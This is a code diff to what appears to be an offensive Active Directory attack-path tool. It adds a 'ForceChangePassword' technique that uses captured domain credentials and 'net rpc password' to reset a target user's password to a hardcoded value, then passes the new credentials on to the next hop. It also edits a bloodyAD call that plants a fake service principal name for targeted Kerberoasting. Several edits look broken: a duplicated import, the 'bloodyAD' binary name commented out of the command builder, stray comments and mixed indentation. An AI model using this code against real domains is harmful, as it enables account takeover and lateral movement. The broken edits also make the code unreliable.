@@ -11,7 +11,7 @@ from exceptions.hop_failed_error import HopFailedError
 from services.printing import print_check, print_warning, print_done
 from utils.runner import run_tool
 from utils.platform import BACKEND
-
+from utils.runner import run_tool, run_system_tool
 
 @dataclass
 class GenericWriteStrategy(ExploitStrategy):
@@ -46,7 +46,7 @@ class GenericWriteStrategy(ExploitStrategy):
             case NodeKind.GROUP:
                 return self._add_member(creds)
             case NodeKind.USER:
-                return self._targeted_kerberoast(creds)
+                return self._force_change_password(creds)
             case NodeKind.COMPUTER:
                 return self._rbcd(creds)
             case _:
@@ -54,7 +54,27 @@ class GenericWriteStrategy(ExploitStrategy):
                     self.edge,
                     f"GenericWrite on {self.target.kind.value} — no known technique"
                 )
-
+            
+    def _force_change_password(self, creds: dict) -> ExploitResult:
+        target_sam  = _sam(self.target.label)
+        new_password = "AutoPwn@1337!"
+		# net rpc password "TargetUser" "newPass" -U "DOMAIN/User%Pass" -S "DC"
+        ok, output = run_system_tool([
+            "net", "rpc", "password", target_sam, new_password,
+            "-U", f"{creds['domain']}/{creds['username']}%{creds['password']}",
+			"-S", creds["dc_ip"]
+		])
+        if not ok:
+            raise HopFailedError(self.edge, f"Force change password failed:\n{output}")
+        print_done(f"Password changed for {target_sam} → {new_password}")
+        return ExploitResult(
+			success=True,
+			output=output,
+			technique="ForceChangePassword",
+			# carry new creds forward so the next hop can use them
+			new_creds={**creds, "username": target_sam, "password": new_password}
+		)
+# bloodyAD set object <target> <attribute> <value>
     # ── Techniques ────────────────────────────────────────────────────────────
 
     def _add_member(self, creds: dict) -> ExploitResult:
@@ -76,8 +96,8 @@ class GenericWriteStrategy(ExploitStrategy):
 
         ok, output = run_tool(_bloodyad(creds, [
             "set", "object", target_sam,
-            "--attribute", "servicePrincipalNames",
-            "--value",     f"fake/roast.{creds['domain']}"
+            "servicePrincipalNames",
+            f"fake/roast.{creds['domain']}"
         ]))
 
         if not ok:
@@ -109,7 +129,7 @@ def _sam(label: str) -> str:
 
 def _bloodyad(creds: dict, subcommand: list[str]) -> list[str]:
     cmd = [
-        "bloodyAD",
+     #   "bloodyAD",
         "--host", creds["dc_ip"],
         "-d",     creds["domain"],
         "-u",     creds["username"],
